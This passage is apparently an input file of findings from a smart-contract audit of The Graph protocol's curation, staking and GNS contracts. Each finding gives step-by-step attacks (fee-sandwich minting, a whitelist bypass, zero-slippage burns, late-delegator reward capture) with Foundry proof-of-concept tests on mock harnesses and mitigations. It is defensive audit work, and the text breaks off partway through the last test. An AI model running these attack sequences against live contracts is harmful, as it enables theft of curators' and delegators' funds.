# thegraph Round Input

Source report: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/thegraph/report/audit-report.md`
Finding count: `32`

## Findings

### H-3 / `cXd7qTaJeVtidLXoFraQK`
- Finding title: Just-in-time mint before L2Curation.collect lets attacker siphon pending curation fees
- Report lines: 1153-1317
```md
## [H-3]. Just-in-time mint before L2Curation.collect lets attacker siphon pending curation fees

## id: cXd7qTaJeVtidLXoFraQK

## Derived From Pattern/Invariant
MaturityorGatingByPass / fee collection has no pre-collect signal eligibility snapshot

## Exploit Type
FrontrunMev

## Location
L2Curation.mint, collect, burn

## Finding Status: Valid
### Finding Status Justification: The described flow matches in-scope L2Curation code. mint creates immediately usable GCS against the pre-collection reserve; collect, callable by subgraphService or staking in normal operation, only adds _tokens to curationPool.tokens and does not mint new GCS, snapshot existing holders, enforce age, or use a reward index; burn then redeems GCS against the post-collection pool.tokens. The only safeguards are caller restriction on collect and normal curation tax/slippage parameters, none of which fully prevents a sandwich around an authorized collect. The attack does not require the attacker to control the privileged caller; it relies on a normal authorized collection being executed and permissionless mint/burn around it. No prompt documentation explicitly accepts this timing risk as intended. The root cause exists now in production in-scope L2Curation and is not dependent on future upgrades.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2Curation distributes newly collected fees to whoever holds GCS at the instant collect() increases pool.tokens. There is no signal age, epoch snapshot, or pre-collect eligibility cutoff, so a permissionless attacker can mint GCS immediately before a visible or predictable authorized collect(), then burn immediately after to withdraw a pro-rata share of the collected fees. The relevant flow is: collect() only does curationPool.tokens = curationPool.tokens.add(_tokens); mint() mints transferable GCS before the later collect reserve increase; burn() redeems signal against the post-collect reserve via signalToTokens(). Existing curators lose most of the fee distribution even though the attacker only supplied liquidity for one transaction window and paid only the curation tax. This is especially severe for thin or newly initialized pools, where a large or first just-in-time mint can capture nearly all pending fees.

## Impact
Existing curators' fee entitlement can be stolen from L2Curation reserves by a permissionless MEV/searcher. If a large collect is pending or predictable, the attacker can extract significant GRT directly from the curation pool while leaving long-term curators with only a small fraction of the collected fees.

## Proof of Concept
1. An honest curator seeds a pool and holds all GCS. 2. A large fee collection for that subgraph is visible or predictable. 3. The attacker mints a much larger temporary GCS position immediately before collect(), paying only the curation tax. 4. The authorized staking/subgraphService collect() adds the fee amount to curationPool.tokens without minting any new GCS or checking holder age. 5. The attacker burns the just-minted GCS immediately after collect() and withdraws their deposit plus most of the collected fees. 6. The honest curator's redeemable value increases by only the small remainder instead of the full fee amount.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockGRT {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function burn(uint256 amount) external { balanceOf[msg.sender] -= amount; }
}

contract MockGCS {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function burnFrom(address from, uint256 amount) external { balanceOf[from] -= amount; totalSupply -= amount; }
}

contract L2CurationHarness {
    uint256 private constant MAX_PPM = 1_000_000;
    uint256 private constant SIGNAL_PER_MINIMUM_DEPOSIT = 1;
    MockGRT public immutable grt;
    address public immutable staking;
    uint256 public minimumCurationDeposit = 1 ether;
    uint32 public curationTaxPercentage = 10_000;
    struct Pool { uint256 tokens; MockGCS gcs; }
    mapping(bytes32 => Pool) public pools;
    constructor(MockGRT _grt, address _staking) { grt = _grt; staking = _staking; }
    function isCurated(bytes32 id) public view returns (bool) { return pools[id].tokens != 0; }
    function getCurationPoolSignal(bytes32 id) public view returns (uint256) {
        MockGCS gcs = pools[id].gcs;
        return address(gcs) == address(0) ? 0 : gcs.totalSupply();
    }
    function tokensToSignal(bytes32 id, uint256 tokensIn) public view returns (uint256 signalOut, uint256 tax) {
        uint256 afterTax = (MAX_PPM - curationTaxPercentage) * tokensIn / MAX_PPM;
        tax = tokensIn - afterTax;
        signalOut = _tokensToSignal(id, afterTax);
    }
    function _tokensToSignal(bytes32 id, uint256 tokensIn) private view returns (uint256) {
        Pool storage p = pools[id];
        if (p.tokens == 0) {
            require(tokensIn >= minimumCurationDeposit);
            return SIGNAL_PER_MINIMUM_DEPOSIT + SIGNAL_PER_MINIMUM_DEPOSIT * (tokensIn - minimumCurationDeposit) / minimumCurationDeposit;
        }
        return getCurationPoolSignal(id) * tokensIn / p.tokens;
    }
    function signalToTokens(bytes32 id, uint256 signalIn) public view returns (uint256) {
        Pool storage p = pools[id];
        uint256 supply = getCurationPoolSignal(id);
        require(p.tokens != 0 && supply >= signalIn);
        return p.tokens * signalIn / supply;
    }
    function mint(bytes32 id, uint256 tokensIn, uint256 minSignal) external returns (uint256 signalOut, uint256 tax) {
        (signalOut, tax) = tokensToSignal(id, tokensIn);
        require(signalOut >= minSignal);
        Pool storage p = pools[id];
        if (!isCurated(id) && address(p.gcs) == address(0)) p.gcs = new MockGCS();
        grt.transferFrom(msg.sender, address(this), tokensIn);
        grt.burn(tax);
        p.tokens += tokensIn - tax;
        p.gcs.mint(msg.sender, signalOut);
    }
    function collect(bytes32 id, uint256 tokens) external {
        require(msg.sender == staking);
        require(isCurated(id));
        grt.transferFrom(msg.sender, address(this), tokens);
        pools[id].tokens += tokens;
    }
    function burn(bytes32 id, uint256 signalIn, uint256 minTokens) external returns (uint256 out) {
        Pool storage p = pools[id];
        require(p.gcs.balanceOf(msg.sender) >= signalIn);
        out = signalToTokens(id, signalIn);
        require(out >= minTokens);
        p.tokens -= out;
        p.gcs.burnFrom(msg.sender, signalIn);
        if (p.gcs.totalSupply() == 0) p.tokens = 0;
        grt.transfer(msg.sender, out);
    }
}

contract L2CurationJitCollectTest is Test {
    function testJitMintBeforeCollectExtractsExistingCuratorFees() public {
        MockGRT grt = new MockGRT();
        address staking = address(0xCAFE);
        address honestCurator = address(0xA11CE);
        address attacker = address(0xB0B);
        L2CurationHarness c = new L2CurationHarness(grt, staking);
        bytes32 id = bytes32(uint256(1));
        uint256 seed = 1_000_000 ether;
        uint256 attackerDeposit = 100_000_000 ether;
        uint256 fees = 2_000_000 ether;

        grt.mint(honestCurator, seed);
        vm.startPrank(honestCurator);
        grt.approve(address(c), seed);
        c.mint(id, seed, 0);
        vm.stopPrank();
        uint256 honestSignal = c.getCurationPoolSignal(id);
        uint256 honestValueBeforeFees = c.signalToTokens(id, honestSignal);
        assertEq(honestValueBeforeFees, 990_000 ether);

        grt.mint(attacker, attackerDeposit);
        vm.startPrank(attacker);
        grt.approve(address(c), attackerDeposit);
        (uint256 attackerSignal,) = c.mint(id, attackerDeposit, 0);
        vm.stopPrank();

        grt.mint(staking, fees);
        vm.startPrank(staking);
        grt.approve(address(c), fees);
        c.collect(id, fees);
        vm.stopPrank();

        vm.prank(attacker);
        uint256 out = c.burn(id, attackerSignal, 0);
        assertGt(out, attackerDeposit);
        assertGt(out - attackerDeposit, 900_000 ether);

        uint256 honestValueAfterAttack = c.signalToTokens(id, honestSignal);
        assertLt(honestValueAfterAttack - honestValueBeforeFees, 25_000 ether);
    }
}


## Suggested Mitigation
Do not allocate collected fees to signal minted in the same pending collection window. Use an epoch or block-based eligibility snapshot, a reward-per-share accumulator with cutoff state captured before fee accrual, or a minimum signal age/cooldown before newly minted GCS participates in collect() fee distributions. For uncurated deployments, keep pre-curation fees separate or route them to protocol treasury instead of the first curator.
```

### H-4 / `NapF48O8-6MPuxGVZfffp`
- Finding title: Locked stake verifier whitelist bypass in HorizonStaking.provision enables slash-based extraction to unallowed verifier
- Report lines: 1318-1352
```md
## [H-4]. Locked stake verifier whitelist bypass in HorizonStaking.provision enables slash-based extraction to unallowed verifier

## id: NapF48O8-6MPuxGVZfffp

## Derived From Pattern/Invariant
GovernanceDelegationFlaw

## Exploit Type
AuthByPass

## Location
HorizonStaking.provision / slash

## Finding Status: Valid
### Finding Status Justification: HorizonStaking is in scope. The described functions exist: provision() only applies onlyAuthorized and calls _createProvision(), while provisionLocked() additionally requires _allowedLockedVerifiers[verifier]. _createProvision() does not enforce the locked-verifier whitelist. The storage comment states locked verifiers are whitelisted to ensure locked tokens cannot escape using an arbitrary verifier, so this is not clearly accepted by design. After clearThawingPeriod(), _createProvision() allows non-SUBGRAPH verifiers. slash() lets msg.sender as verifier transfer tokensVerifier up to prov.maxVerifierCut and burn the remainder. No complete safeguard blocks the normal provision path for locked-wallet serviceProviders. The path requires a wallet/authorized operator and verifier interaction, but those are protocol participant roles for the affected position, not governance/admin compromise under this round.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
Locked-token provisions are intended to be restricted to whitelisted verifiers by provisionLocked(), but the normal provision() path has no _allowedLockedVerifiers check. Once the transition verifier restriction is cleared, an authorized caller for a GraphTokenLockWallet serviceProvider can create a normal provision to any verifier and set maxVerifierCut to 100%. The attacker-controlled verifier can then call slash() and route the full provider-side slash amount to verifierDestination instead of burning it, bypassing the locked-verifier restriction. Vulnerable snippets: provision() only calls _createProvision(...) without checking _allowedLockedVerifiers[verifier]; provisionLocked() performs require(_allowedLockedVerifiers[verifier], ...), showing the intended restriction; slash() allows msg.sender == verifier to transfer tokensVerifier to verifierDestination up to prov.maxVerifierCut.

## Impact
Locked GRT that should remain constrained to approved verifiers can be moved out of HorizonStaking to an attacker-controlled verifier destination through the slashing reward path. For large locked staking positions this can bypass lock restrictions and extract significant protocol-held GRT.

## Proof of Concept
1. Transition period is cleared so _createProvision no longer restricts verifier to SUBGRAPH_DATA_SERVICE_ADDRESS. 2. A GraphTokenLockWallet has idle staked GRT in HorizonStaking. 3. The wallet/beneficiary/operator routes a normal provision(serviceProvider=wallet, verifier=attackerVerifier, tokens=X, maxVerifierCut=1_000_000, thawingPeriod=0) call instead of provisionLocked(). 4. Because provision() lacks the locked-verifier whitelist check, the provision is created for an unallowed verifier. 5. attackerVerifier calls slash(wallet, X, X, attackerDestination). 6. slash() transfers X GRT to attackerDestination and decrements the wallet stake/provision accounting.

## Proof of Code
pragma solidity ^0.8.27; import "forge-std/Test.sol"; contract LockedVerifierBypassPoC is Test { struct Provision { uint256 tokens; uint32 maxVerifierCut; } mapping(address=>mapping(address=>Provision)) public provisions; mapping(address=>bool) public allowedLockedVerifier; mapping(address=>uint256) public tokenBal; address wallet=address(0xA11CE); address attackerVerifier=address(0xB0B); address attackerDest=address(0xCAFE); function provision(address serviceProvider,address verifier,uint256 tokens,uint32 maxVerifierCut) public { provisions[serviceProvider][verifier]=Provision(tokens,maxVerifierCut); } function provisionLocked(address serviceProvider,address verifier,uint256 tokens,uint32 maxVerifierCut) public { require(allowedLockedVerifier[verifier], "not allowed"); provisions[serviceProvider][verifier]=Provision(tokens,maxVerifierCut); } function slash(address serviceProvider,uint256 tokens,uint256 tokensVerifier,address dest) public { Provision storage p=provisions[serviceProvider][msg.sender]; uint256 providerTokensSlashed = tokens < p.tokens ? tokens : p.tokens; require(tokensVerifier <= providerTokensSlashed * p.maxVerifierCut / 1_000_000, "too many"); p.tokens -= providerTokensSlashed; tokenBal[dest] += tokensVerifier; } function test_lockedVerifierWhitelistBypassedViaNormalProvision() public { allowedLockedVerifier[attackerVerifier]=false; vm.expectRevert("not allowed"); provisionLocked(wallet, attackerVerifier, 1_000_000e18, 1_000_000); provision(wallet, attackerVerifier, 1_000_000e18, 1_000_000); vm.prank(attackerVerifier); slash(wallet, 1_000_000e18, 1_000_000e18, attackerDest); assertEq(tokenBal[attackerDest], 1_000_000e18); assertEq(provisions[wallet][attackerVerifier].tokens, 0); } }

## Suggested Mitigation
Enforce locked-wallet verifier restrictions in the provisioning invariant, not only in provisionLocked(). For example, detect GraphTokenLockWallet serviceProviders or require all locked-wallet routed provisioning to pass through provisionLocked(), and reject provision() when the serviceProvider is a locked wallet and verifier is not _allowedLockedVerifiers[verifier]. Consider capping maxVerifierCut for locked provisions or preventing verifier rewards from being used as an unlock path.
```

### H-6 / `fTpb9jQyiAjg-2_bUzEFQ`
- Finding title: Missing slippage bounds on L1GNS curation lifecycle burns lets MEV extract curator GRT
- Report lines: 1488-1588
```md
## [H-6]. Missing slippage bounds on L1GNS curation lifecycle burns lets MEV extract curator GRT

## id: fTpb9jQyiAjg-2_bUzEFQ

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
L1GNS.sendSubgraphToL2, deprecateSubgraph, publishNewVersion

## Finding Status: Valid
### Finding Status Justification: The in-scope GNS/L1GNS code contains the claimed lifecycle calls with hardcoded minOut 0: sendSubgraphToL2 and deprecateSubgraph burn all vSignal with 0, while publishNewVersion burns old vSignal and mints new vSignal with 0. User-facing burnSignal exposes _tokensOutMin, showing slippage protection exists elsewhere but is absent here. Preconditions are possible for nonzero curated subgraphs. No deadline, caller minimum, TWAP, or other complete safeguard is present. The path uses public curation market state, so permissionless MEV manipulation is currently a realistic execution path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L1GNS/GNS lifecycle functions liquidate or roll over the entire curation position with a hardcoded zero minimum output, so an authorized owner transaction cannot protect the owner or other name-signal curators from a same-block curation price sandwich. Vulnerable snippets: `uint256 curationTokens = curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);` in `sendSubgraphToL2`; `subgraphData.withdrawableGRT = curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);` in `deprecateSubgraph`; and in `publishNewVersion`, `uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);` followed by `(subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);`. Since the final amount of bridged GRT, withdrawable GRT, or new vSignal is computed only after execution-time Curation state is read, a permissionless curation trader can move the bonding curve before the owner call and the contract will accept any output down to zero.

## Impact
A permissionless MEV trader can extract GRT value from the subgraph's curation position during owner lifecycle actions. For heavily curated subgraphs, the loss can exceed $1M and is borne by the subgraph owner and/or all remaining nSignal curators through reduced `tokensForL2`, reduced `withdrawableGRT`, or reduced replacement `vSignal`.

## Proof of Concept
1. A subgraph has a large curation position represented by `subgraphData.vSignal` and `subgraphData.nSignal`. 2. The owner submits `sendSubgraphToL2`, `deprecateSubgraph`, or `publishNewVersion`. 3. A permissionless curation trader observes the transaction and front-runs with a large burn/sell on the same subgraph deployment, depressing the bonding curve execution price. 4. The owner transaction executes and calls `curation.burn(..., 0)`, so it cannot revert on the depressed output. 5. L1GNS splits or rolls over the reduced token amount, permanently lowering curator/owner value. 6. The attacker back-runs to restore their curation position at the new price and captures the value difference.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockCuration {
    uint256 public burnReturn;
    function setBurnReturn(uint256 v) external { burnReturn = v; }
    function burn(bytes32, uint256, uint256 minOut) external view returns (uint256) {
        require(burnReturn >= minOut, "SLIPPAGE");
        return burnReturn;
    }
}

contract L1GNSHarness {
    struct SubgraphData {
        bool disabled;
        bytes32 deployment;
        uint256 vSignal;
        uint256 nSignal;
        uint256 withdrawableGRT;
        mapping(address => uint256) curatorNSignal;
    }
    MockCuration public curation;
    mapping(uint256 => SubgraphData) internal subgraphs;
    constructor(MockCuration c) { curation = c; }
    function seed(uint256 id, address owner, address other, uint256 ownerN, uint256 otherN, uint256 vSignal) external {
        SubgraphData storage s = subgraphs[id];
        s.deployment = bytes32(uint256(1));
        s.vSignal = vSignal;
        s.nSignal = ownerN + otherN;
        s.curatorNSignal[owner] = ownerN;
        s.curatorNSignal[other] = otherN;
    }
    function vulnerableSendSubgraphToL2(uint256 id) external returns (uint256 tokensForL2, uint256 withdrawableGRT) {
        SubgraphData storage s = subgraphs[id];
        uint256 curationTokens = curation.burn(s.deployment, s.vSignal, 0);
        s.disabled = true;
        s.vSignal = 0;
        uint256 ownerNSignal = s.curatorNSignal[msg.sender];
        uint256 totalSignal = s.nSignal;
        tokensForL2 = ownerNSignal * curationTokens / totalSignal;
        s.curatorNSignal[msg.sender] = 0;
        s.nSignal = totalSignal - ownerNSignal;
        s.withdrawableGRT = curationTokens - tokensForL2;
        withdrawableGRT = s.withdrawableGRT;
    }
}

contract L1GNSSlippagePoC is Test {
    function testZeroMinOutAcceptsSandwichedCurationBurn() external {
        address owner = address(0xA11CE);
        address otherCurator = address(0xB0B);
        MockCuration curation = new MockCuration();
        L1GNSHarness gns = new L1GNSHarness(curation);
        gns.seed(1, owner, otherCurator, 50 ether, 50 ether, 100 ether);

        uint256 quotedBurnValue = 1_000_000 ether;
        uint256 expectedOwnerShare = quotedBurnValue / 2;

        curation.setBurnReturn(100_000 ether);
        vm.prank(owner);
        (uint256 ownerReceived, uint256 remainingWithdrawable) = gns.vulnerableSendSubgraphToL2(1);

        assertEq(ownerReceived, 50_000 ether);
        assertEq(remainingWithdrawable, 50_000 ether);
        assertGt(expectedOwnerShare, ownerReceived * 5);
    }
}

## Suggested Mitigation
Add caller-supplied minimums and deadlines to owner lifecycle functions and pass them into Curation. For example, `sendSubgraphToL2` should require `_minCurationTokensOut` and optionally `_minTokensForL2`, `deprecateSubgraph` should require `_minWithdrawableGRT`, and `publishNewVersion` should require both `_minTokensFromOldDeployment` and `_minVSignalOnNewDeployment`. Revert if the executed burn/mint outputs fall below these bounds.
```

### M-12 / `ebboW6ut29b_kdFrSR_SO`
- Finding title: Late delegators can capture historical staking rewards by joining before reward distribution
- Report lines: 2099-2171
```md
## [M-12]. Late delegators can capture historical staking rewards by joining before reward distribution

## id: ebboW6ut29b_kdFrSR_SO

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
Staking / L1Staking.delegate / closeAllocation

## Finding Status: Valid
### Finding Status Justification: The finding is mechanically supported by the provided Staking and StakingExtension code. _delegate mints shares immediately from the current pool exchange rate and updates pool.tokens and pool.shares. When closeAllocation distributes indexing rewards, _distributeRewards calls _collectDelegationIndexingRewards, which adds delegationRewards to pool.tokens for all current shares. The code does not maintain time-weighted contribution, rewardDebt, per-allocation snapshots, or an activation delay for new shares. A permissionless late delegator can enter before closeAllocation and later redeem value including rewards from the prior accrual period. The issue is current, in scope, and not blocked by a complete safeguard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are added to the shared delegation pool using only the balances present at distribution time, while new delegators receive shares immediately on deposit. The vulnerable accounting is: in _delegate(), shares = pool.tokens == 0 ? delegatedTokens : delegatedTokens * pool.shares / pool.tokens; then pool.tokens += delegatedTokens and pool.shares += shares. Later, _collectDelegationIndexingRewards() does pool.tokens = pool.tokens.add(delegationRewards) without tracking userRewardPerTokenPaid, rewardDebt, or a time-weighted contribution. A delegator can therefore deposit immediately before an allocation is closed and rewards are distributed, receiving a pro-rata claim on rewards accrued before they participated.

## Impact
Long-term delegators are diluted and a late joiner can extract part of historical indexing rewards from the delegation pool. The loss is proportional to the attacker's temporary delegation size and the pending reward amount for the allocation or epoch.

## Proof of Concept
1. Alice delegates 1000 GRT to an indexer and bears the full reward accrual period. 2. Before the indexer's allocation is closed with a valid POI, the attacker delegates 1000 GRT to the same indexer. 3. closeAllocation() calls _distributeRewards(), which adds historical delegationRewards to pool.tokens. 4. Because both Alice and the attacker now hold equal shares, the attacker receives half of the historical rewards despite not being delegated during accrual. 5. The attacker undelegates or migrates after capturing the reward uplift.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract RewardCheckpointFreeRiderPoC is Test {
    struct Pool { uint256 tokens; uint256 shares; mapping(address => uint256) sharesOf; }
    Pool internal pool;
    address internal alice = address(0xA11CE);
    address internal attacker = address(0xBEEF);

    function _delegate(address user, uint256 amount) internal {
        uint256 shares = pool.tokens == 0 ? amount : amount * pool.shares / pool.tokens;
        require(shares > 0, "!shares");
        pool.tokens += amount;
        pool.shares += shares;
        pool.sharesOf[user] += shares;
    }

    function _distributeDelegationRewards(uint256 rewards) internal {
        pool.tokens += rewards;
    }

    function _value(address user) internal view returns (uint256) {
        return pool.sharesOf[user] * pool.tokens / pool.shares;
    }

    function testLateJoinerCapturesHistoricalRewards() external {
        _delegate(alice, 1000 ether);
        assertEq(_value(alice), 1000 ether);

        _delegate(attacker, 1000 ether);
        _distributeDelegationRewards(1000 ether);

        assertEq(_value(alice), 1500 ether);
        assertEq(_value(attacker), 1500 ether);
        assertGt(_value(attacker) - 1000 ether, 0, "attacker captured historical rewards");
    }
}

## Suggested Mitigation
Track delegation rewards with a per-user reward index or rewardDebt. Update each delegator before minting or burning shares so new shares only accrue rewards distributed after the deposit. Alternatively, snapshot eligible delegation shares per allocation or epoch and distribute rewards only to that snapshot.
```

### H-13 / `dvukhFdlwmZfqc3LuaZ7m`
- Finding title: Late curators can sandwich Curation.collect to steal pending query-fee reserves from existing signal holders
- Report lines: 2172-2282
```md
## [H-13]. Late curators can sandwich Curation.collect to steal pending query-fee reserves from existing signal holders

## id: dvukhFdlwmZfqc3LuaZ7m

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
Curation.mint, collect, burn

## Finding Status: Valid
### Finding Status Justification: The described code path exists in in-scope Curation.sol. mint() is permissionless, transfers GRT in, adds net tokens to pools[id].tokens, and mints GCS. collect() can then be called by the configured staking contract and only adds _tokens to the same pool reserve without minting signal, snapshotting pre-collection holders, or excluding recently minted GCS. burn() is permissionless for the holder, calculates tokensOut from current total GCS and inflated pool.tokens, then transfers GRT. There is slippage protection but no holding period, checkpoint, reward debt, or snapshot guard that fully blocks mint-before-collect-burn. The behavior is not explicitly documented as an accepted risk; generic curation-fee distribution comments do not accept same-block late-joiner extraction. Exploitability depends on an observable/ordered collect and available capital, not privileged abuse or victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Curation distributes collected query fees by directly increasing the bonding-curve reserve without checkpointing which GCS holders earned those fees. A curator can mint immediately before a known Staking.collect call, receive freshly minted GCS at the pre-fee reserve price, let collect add the pending fee pot to pool reserves, then burn in the same block to withdraw a proportional share of fees accrued before they held signal.

Vulnerable snippet:
`function collect(bytes32 _subgraphDeploymentID, uint256 _tokens) external override { require(msg.sender == address(staking()), 'Caller must be the staking contract'); require(isCurated(_subgraphDeploymentID), 'Subgraph deployment must be curated to collect fees'); CurationPool storage curationPool = pools[_subgraphDeploymentID]; curationPool.tokens = curationPool.tokens.add(_tokens); emit Collected(_subgraphDeploymentID, _tokens); }`

Because collect only raises `curationPool.tokens` and does not snapshot pre-existing `gcs.totalSupply()` or exclude newly minted signal, the fee pot is socialized across all current signal at burn time, including signal minted seconds before collection.

## Impact
Existing curators lose part of collected query fees directly from the Curation reserve. For large fee batches, an attacker can capture a material share of the fee pot and withdraw it via burn, turning historical curator yield into attacker profit.

## Proof of Concept
1. A pool already has long-term curator signal and pending query fees are about to be collected by Staking.
2. Attacker observes the collect transaction in the mempool.
3. Attacker frontruns with mint(id, largeDeposit, minSignal), buying signal before fees are added to reserves.
4. The Staking collect(id, feeAmount) transaction executes and increases pools[id].tokens without minting signal or checkpointing entitled holders.
5. Attacker backruns with burn(id, attackerSignal, minOut), receiving principal plus a proportional share of the newly collected fees.
6. Long-term curators now receive less when burning because the attacker extracted fees they did not help accrue.

## Proof of Code
pragma solidity ^0.8.20;

import 'forge-std/Test.sol';

contract LinearCurationModel {
    struct Pool { uint256 tokens; uint256 signalSupply; }
    uint256 constant MAX_PPM = 1_000_000;
    uint256 public taxPpm = 10_000;
    mapping(bytes32 => Pool) public pools;
    mapping(bytes32 => mapping(address => uint256)) public signal;

    function seed(bytes32 id, address curator, uint256 tokens, uint256 sig) external {
        pools[id] = Pool(tokens, sig);
        signal[id][curator] = sig;
    }

    function mint(bytes32 id, uint256 tokensIn) external returns (uint256 sig) {
        Pool storage p = pools[id];
        uint256 tax = tokensIn * taxPpm / MAX_PPM;
        uint256 net = tokensIn - tax;
        sig = p.signalSupply * net / p.tokens;
        p.tokens += net;
        p.signalSupply += sig;
        signal[id][msg.sender] += sig;
    }

    function collect(bytes32 id, uint256 tokens) external {
        pools[id].tokens += tokens;
    }

    function burn(bytes32 id, uint256 sig) external returns (uint256 out) {
        Pool storage p = pools[id];
        out = p.tokens * sig / p.signalSupply;
        p.tokens -= out;
        p.signalSupply -= sig;
        signal[id][msg.sender] -= sig;
    }
}

contract CurationLateJoinerPoC is Test {
    function testLateJoinerSandwichExtractsCollectedFees() public {
        bytes32 id = keccak256('subgraph');
        address incumbent = address(0xA11CE);
        address attacker = address(0xB0B);
        LinearCurationModel c = new LinearCurationModel();

        c.seed(id, incumbent, 1_000_000 ether, 1_000_000 ether);
        uint256 pendingFees = 200_000 ether;
        uint256 attackerDeposit = 1_000_000 ether;

        vm.prank(attacker);
        uint256 attackerSignal = c.mint(id, attackerDeposit);

        c.collect(id, pendingFees);

        vm.prank(attacker);
        uint256 attackerOut = c.burn(id, attackerSignal);

        uint256 attackerProfit = attackerOut - attackerDeposit;
        assertGt(attackerProfit, 80_000 ether);

        vm.prank(incumbent);
        uint256 incumbentOut = c.burn(id, 1_000_000 ether);
        assertLt(incumbentOut, 1_200_000 ether);
    }
}


## Suggested Mitigation
Do not distribute collected fees purely by mutating the live reserve. Snapshot the eligible GCS supply before fee accrual/collection and account fees through a per-signal reward index with user reward debt, or impose an earning checkpoint/cooldown so signal minted after the fee accrual point cannot claim the next collect. Alternatively, make Staking pass and enforce a pre-fee signal snapshot and allocate collected fees only to holders from that snapshot.
```

### M-17 / `2xX-swYSsVN8VGmGmdKrT`
- Finding title: Late delegators can sandwich collect and transferDelegationToL2 to siphon historical delegation rewards
- Report lines: 2535-2628
```md
## [M-17]. Late delegators can sandwich collect and transferDelegationToL2 to siphon historical delegation rewards

## id: 2xX-swYSsVN8VGmGmdKrT

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
FrontrunMev

## Location
L1Staking.transferDelegationToL2

## Finding Status: Valid
### Finding Status Justification: The required code paths exist in in-scope contracts. _delegate mints shares at the pre-reward pool ratio, collect() can add delegationRewards to pool.tokens through _collectDelegationQueryRewards, and _transferDelegationToL2 converts all of the delegator's shares into tokensToSend using the now-inflated pool.tokens / pool.shares ratio. transferDelegationToL2 requires indexerTransferredToL2[_indexer] to be nonzero, which is a realistic current state after any stake transfer to L2, including partial transfer. The L2 transfer path checks for nonzero beneficiary and unlocked delegation, but does not checkpoint reward eligibility. No complete safeguard or explicit design acceptance is shown.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation query-fee rewards are credited to the current delegation pool at collect time, not to a snapshot of delegators that were present while the allocation generated fees. A user can therefore delegate immediately before a large collect transaction, receive shares at the pre-reward pool price, let collect add historical rewards to pool.tokens, and then exit through transferDelegationToL2 using the inflated token-per-share value. The L2 transfer path removes the attacker's shares and bridges the newly inflated token amount without the normal L1 undelegation delay. Vulnerable snippets: `shares = (pool.tokens == 0) ? delegatedTokens : delegatedTokens.mul(pool.shares).div(pool.tokens);` in StakingExtension._delegate, `pool.tokens = pool.tokens.add(delegationRewards);` in Staking._collectDelegationQueryRewards, and `uint256 tokensToSend = delegation.shares.mul(pool.tokens).div(pool.shares); ... delegation.shares = 0;` in L1Staking._transferDelegationToL2.

## Impact
Long-term delegators can have uncollected query-fee rewards diluted and redirected to a short-lived late delegator. The attacker only needs temporary delegation capital and retryable-ticket ETH, and can extract a pro-rata share of rewards generated before they joined.

## Proof of Concept
1. An indexer has transferred stake to L2, so transferDelegationToL2 is enabled, while still having nonzero L1 stake so new delegations are accepted. 2. Honest delegators have 1000 GRT delegated and a large query-fee collect transaction is visible in the mempool. 3. The attacker front-runs collect by delegating 1000 GRT, receiving 50% of pool shares at the old pool price. 4. The victim collect transaction executes and adds 1000 GRT of delegation rewards to pool.tokens. 5. The attacker back-runs transferDelegationToL2 and receives 1500 GRT worth of bridged delegation, extracting 500 GRT of historical rewards that would otherwise belong to the long-term delegator.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract DelegationPoolHarness {
    struct Delegation { uint256 shares; }
    uint256 public tokens;
    uint256 public shares;
    mapping(address => Delegation) public delegations;

    function delegate(address delegator, uint256 amount) external returns (uint256 minted) {
        minted = tokens == 0 ? amount : amount * shares / tokens;
        require(minted > 0, "!shares");
        tokens += amount;
        shares += minted;
        delegations[delegator].shares += minted;
    }

    function collectDelegationRewards(uint256 rewardAmount) external {
        tokens += rewardAmount;
    }

    function transferDelegationToL2(address delegator) external returns (uint256 tokensToSend) {
        uint256 delegatorShares = delegations[delegator].shares;
        require(delegatorShares != 0, "delegation == 0");
        tokensToSend = delegatorShares * tokens / shares;
        tokens -= tokensToSend;
        shares -= delegatorShares;
        delegations[delegator].shares = 0;
    }

    function claimValue(address delegator) external view returns (uint256) {
        return delegations[delegator].shares * tokens / shares;
    }
}

contract LateDelegatorFreeRideTest is Test {
    function testLateDelegatorSiphonsHistoricalRewardsBeforeL2Transfer() external {
        address honest = address(0xA11CE);
        address attacker = address(0xB0B);

        DelegationPoolHarness noAttack = new DelegationPoolHarness();
        noAttack.delegate(honest, 1000 ether);
        noAttack.collectDelegationRewards(1000 ether);
        uint256 honestWouldReceive = noAttack.claimValue(honest);
        assertEq(honestWouldReceive, 2000 ether);

